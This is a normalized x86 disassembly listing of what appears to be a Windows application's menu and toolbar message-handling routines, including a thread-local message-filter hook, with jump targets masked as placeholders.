mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
call sub_44d0a0
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_44973c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
jmp r-xdata
mov al 0x1
sub_43879c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov ebx eax
lea eax [ ebp - 0x2c ]
xor ecx ecx
mov edx 0x2c
call sub_402d24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xfffffd3a
mov eax ebx
call sub_435204
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
push 0x4e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
pop ebx
mov esp ebp
pop ebp
retn
sub_43880c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44d1c8
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
sub eax 0x200
je r-xdata
push ebp
mov eax [ ebp - 0x10 ]
call sub_4386e8
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x5d ] 0x1
je r-xdata
push ebp
mov eax [ ebp - 0x10 ]
call sub_4386e8
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c9 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x10 ]
call sub_4386e8
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x17d ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4491dc
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44d1c8
call sub_432ff0
cmp eax 0x40047
jl r-xdata
mov dl 0x1
mov eax [ ebp - 0xc ]
call sub_4491ec
mov eax [ ebp - 0xc ]
cmp [ eax + 0x16a ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx + 0x17d ] 0x2
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_44973c
test al al
jne r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x48 ]
sub eax 0xe
mov edx [ ebp - 0x10 ]
movsx edx [ edx + 0x8 ]
cmp eax edx
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4364cc
jmp r-xdata
cmp [ eax + 0x16b ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x178 ] 0x0
jne r-xdata
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x17d ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_438a40
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0xc ]
call sub_43879c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ ebp - 0x28 ] eax
push 0x1
push 0x201
push 0x201
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
cmp [ eax + 0x174 ] 0x0
je r-xdata
cmp [ eax + 0x17d ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x202
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
xor edx edx
call sub_434f10
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
jmp r-xdata
retn
sub_438a5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438b0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor edi edi
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
mov edi eax
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax edi
call sub_448fb4
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x6 ]
call sub_45fcd0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438b12
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_438b1c
test cl cl
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp dl 0x1
jne r-xdata
test dl dl
jne r-xdata
cmp [ eax + 0x272 ] 0x0
setne al
jmp r-xdata
test dl dl
jne r-xdata
cmp [ eax + 0x282 ] 0x0
jne r-xdata
xor eax eax
cmp [ eax + 0x26a ] 0x0
jne r-xdata
retn
xor eax eax
retn
cmp [ eax + 0x27a ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x272 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x272 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x26a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x282 ] 0x0
jne r-xdata
cmp [ eax + 0x272 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_438bb0
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x26a ] 0x0
je r-xdata
cmp [ esi + 0x27a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x26c ]
call [ esi + 0x268 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x27c ]
call [ esi + 0x278 ]
sub_438c08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x272 ] 0x0
je r-xdata
cmp [ esi + 0x282 ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov ax [ ebp - 0x6 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x274 ]
call [ esi + 0x270 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x284 ]
call [ esi + 0x280 ]
sub_438c84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
mov edi [ rw-data ]
test edi edi
je r-xdata
xor ebx ebx
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov esi [ ebp - 0x4 ]
mov eax edi
call sub_436554
mov [ ebp - 0x8 ] eax
test bl bl
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
cmp esi eax
jne r-xdata
dec esi
mov esi [ ebp - 0x8 ]
dec esi
jmp r-xdata
inc esi
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx esi
mov eax edi
call sub_43653c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx esi
mov eax edi
call sub_43653c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x16b ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebx + 0x16b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438d30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
push esi
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45b370
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp esi 0x2
jne r-xdata
mov eax edi
call sub_45c9ac
test al al
je r-xdata
xor edi edi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp eax 0x25
jne r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x100
je r-xdata
mov [ rw-data ] 0x1
push 0x0
push 0x28
push 0x100
mov eax [ ebx ]
push eax
call PostMessageA
cmp eax 0x27
jne r-xdata
mov [ ebx + 0x8 ] 0x27
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp eax 0xd
jne r-xdata
sub eax 0x4
je r-xdata
mov [ ebx + 0x8 ] 0x25
cmp eax 0x1b
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x2d8 ] 0x1
jmp r-xdata
cmp [ ebx + 0x8 ] 0x12
jne r-xdata
sub eax 0x1b
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
test edi edi
je r-xdata
mov eax [ rw-data ]
mov si 0xffb3
call sub_403564
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_406dec
cmp ax 0xffff
jne r-xdata
sub eax 0xe1
je r-xdata
cmp [ ebx + 0x8 ] 0x27
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov [ rw-data ] 0x0
mov [ ebp - 0xd ] 0x0
mov eax [ ebx + 0x8 ]
call sub_406dec
test al 0x10
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ rw-data ]
jne r-xdata
jmp r-xdata
cmp [ ebx + 0x8 ] 0x25
jne r-xdata
mov eax [ rw-data ]
call sub_45adb4
test eax eax
jne r-xdata
mov ebx edi
mov eax ebx
call sub_435204
cmp eax [ rw-data ]
je r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov [ ebp - 0xd ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
xor edx edx
call sub_447838
mov edi eax
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ rw-data ]
je r-xdata
xor edi edi
mov eax [ rw-data ]
mov si 0xfff2
call sub_403564
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov al 0x1
call sub_438c84
mov edi eax
jmp r-xdata
cmp [ ebx + 0x16b ] 0x0
je r-xdata
movzx eax [ ebx + 0x8 ]
mov ebx eax
movzx eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call GetSubMenu
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov si 0xffb3
call sub_403564
jmp r-xdata
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_406318
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0xc ]
mov eax edi
call sub_448acc
jmp r-xdata
xor eax eax
call sub_438c84
mov edi eax
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x2cc ]
mov cl [ ebp - 0xd ]
mov edx ebx
call sub_45c208
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
call sub_44fab8
test al al
je r-xdata
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ eax + 0x2c8 ] 0x0
mov edx ebx
mov eax [ rw-data ]
mov si 0xffb1
call sub_403564
mov edx ebx
mov eax [ rw-data ]
mov si 0xffb1
call sub_403564
sub_439004
mov [ rw-data ] 0x0
push rw-data
call GetCursorPos
cmp [ rw-data ] 0x0
jne r-xdata
retn
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_438d30
push eax
push 0xffffffff
call SetWindowsHookExA
mov [ rw-data ] eax
sub_43903c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
sub_439078
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
push edi
mov eax [ rw-data ]
push eax
call CallNextHookEx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x4 ]
cmp eax 0xb001
jne r-xdata
cmp eax 0x111
jne r-xdata
mov eax [ rw-data ]
mov si 0xffb3
call sub_403564
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call sub_439128
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0x102
je r-xdata
mov eax [ rw-data ]
call sub_44f7b4
mov [ ebx ] eax
cmp eax 0x100
je r-xdata
cmp eax 0x101
je r-xdata
cmp eax 0x104
je r-xdata
cmp eax 0x105
jne r-xdata
sub_43914c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x2d0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2d4 ] 0x0
je r-xdata
mov eax [ ebx + 0x2d4 ]
cmp [ eax + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x2cc ] 0x0
je r-xdata
mov eax [ ebx + 0x2cc ]
mov eax [ eax + 0x34 ]
call sub_45adb4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x2cc ]
call sub_403368
xor eax eax
mov [ ebx + 0x2cc ] eax
xor eax eax
mov [ ebx + 0x2d4 ] eax
xor eax eax
mov [ ebx + 0x2d0 ] eax
mov eax [ ebx + 0x2cc ]
mov eax [ eax + 0x34 ]
mov edx esi
call sub_45adc4
mov edi eax
mov eax [ ebx + 0x2cc ]
mov eax [ eax + 0x34 ]
mov edx esi
call sub_45aff4
mov ecx edi
xor edx edx
mov eax [ ebx + 0x2d0 ]
call sub_45af40
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4391f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c8 ] 0x0
xor edx edx
push ebp
push sub_4394f9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x178 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x174 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2cc ] eax
jmp r-xdata
call sub_403bc8
jmp r-xdata
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43914c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d4a0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2cc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x174 ]
call sub_45b370
test eax eax
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448b24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x16b ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
call sub_45d564
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
mov [ eax + 0x68 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x174 ]
call sub_45b370
test eax eax
je r-xdata
mov dl [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
call sub_45cd28
mov al 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x174 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x174 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d0 ] ebx
mov eax ebx
call sub_45adb4
dec eax
cmp eax 0x0
jl r-xdata
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
call sub_45c944
push 0x0
or ecx 0xffffffff
mov edx 0x448
mov eax [ ebp - 0x4 ]
call sub_44a180
xor eax eax
push ebp
push sub_43949b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4489fc
mov edx eax
lea ecx [ ebp - 0x1c ]
xor eax eax
call sub_406318
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x12 ]
mov eax [ ebp - 0x8 ]
call sub_448acc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
call sub_45c9ac
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_435204
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
call sub_439004
xor eax eax
jmp r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d9 ] 0x1
lea edx [ ebp - 0x12 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_467444
call sub_466278
mov ebx eax
push 0xf
call GetSystemMetrics
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
mov eax [ eax + 0x34 ]
call sub_45adb4
imul esi eax
add esi [ ebp - 0xe ]
cmp ebx esi
jge r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
add [ ebp - 0x12 ] eax
mov [ ebp - 0xa ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
mov edx ebx
call sub_45adc4
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
mov edx ebx
call sub_45aff4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
mov eax [ eax + 0x34 ]
mov ecx esi
xor edx edx
call sub_45af40
dec ebx
cmp ebx 0xffffffff
jne r-xdata
jmp r-xdata
call sub_432ff0
cmp eax 0x50050
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
sub [ ebp - 0xe ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2cc ]
mov ecx [ ebp - 0xe ]
mov edx [ ebp - 0x12 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4394a2
cmp [ ebp - 0xa ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
retn
call sub_43903c
sub_4394a2
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2d4 ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push 0x0
push 0x0
push 0x1400
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call PostMessageA
retn
push 0x0
mov eax [ ebp - 0x8 ]
call sub_435204
mov ecx eax
mov edx 0x448
mov eax [ ebp - 0x4 ]
call sub_44a180
sub_43950c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx edi
call sub_4188a0
cmp [ eax + 0x174 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx edi
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov bl 0x1
jmp r-xdata
sub_439578
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c9 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x227 ] 0x0
je r-xdata
push ebp
call sub_43950c
pop ecx
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
cmp [ ebx + 0x8 ] 0x20
je r-xdata
cmp [ ebx + 0x8 ] 0x2d
je r-xdata
call GetCapture
test eax eax
jne r-xdata
mov ax [ ebx + 0x8 ]
test ax ax
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_438a5c
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403564
mov [ ebx + 0xc ] 0x1
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
sub_439628
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov [ ebx + 0x2c8 ] 0x0
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_406318
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax esi
call sub_448acc
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_448af8
lea eax [ esp + 0x8 ]
call sub_406e5c
push eax
push 0x1
push 0x201
mov eax ebx
call sub_44f7b4
push eax
call PostMessageA
add esp 0x10
pop esi
pop ebx
retn
sub_439684
push ebx
push esi
push edi
mov edi edx
mov ebx eax
push 0x0
mov ecx 0x1
mov edx 0x449
mov eax ebx
call sub_44a180
mov [ rw-data ] ebx
mov dl 0x1
mov eax ebx
call sub_4491ec
call sub_439104
test edi edi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x448
mov eax ebx
call sub_44a180
push 0x0
mov eax edi
call sub_435204
mov ecx eax
mov edx 0x448
mov eax ebx
call sub_44a180
mov edx edi
mov eax ebx
mov si 0xffb1
call sub_403564
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x2c8 ] 0x1
test edi edi
jne r-xdata
sub_4396fc
push ebx
mov ebx eax
cmp [ ebx + 0x2c9 ] 0x0
je r-xdata
mov [ ebx + 0x2c9 ] 0x0
mov [ ebx + 0x2c8 ] 0x0
push 0x0
or ecx 0xffffffff
mov edx 0x448
mov eax ebx
call sub_44a180
pop ebx
retn
call sub_439128
xor edx edx
mov eax ebx
call sub_4491ec
push 0x0
xor ecx ecx
mov edx 0x449
mov eax ebx
call sub_44a180
sub_439748
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov ebx [ rw-data ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403564
xor eax eax
push ebp
push sub_4397e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c9 ] 0x1
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c9 ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403564
mov al 0x1
jmp r-xdata
mov eax [ ebx ]
call sub_4688c8
mov eax [ ebx ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4397e8
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403564
retn
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4397f8
push ebx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44c544
pop ebx
retn
cmp [ ebx + 0x227 ] 0x0
je r-xdata
push 0x0
mov eax [ ebx + 0x68 ]
call sub_4241ec
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44a180
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_44cd54
sub_439858
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4399fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edi [ esi + 0x218 ]
cmp eax [ edi + 0x8 ]
jl r-xdata
mov edx [ ebx + 0xc ]
mov eax edi
call sub_4188a0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebp - 0x1 ] al
cmp [ esi + 0x29a ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a02
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403518
mov edi eax
mov al [ edi + 0x17d ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0xc ]
mov eax [ esi + 0x218 ]
sub ecx [ eax + 0x8 ]
add ecx [ esi + 0x264 ]
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
cmp [ ebp - 0x8 ] 0x0
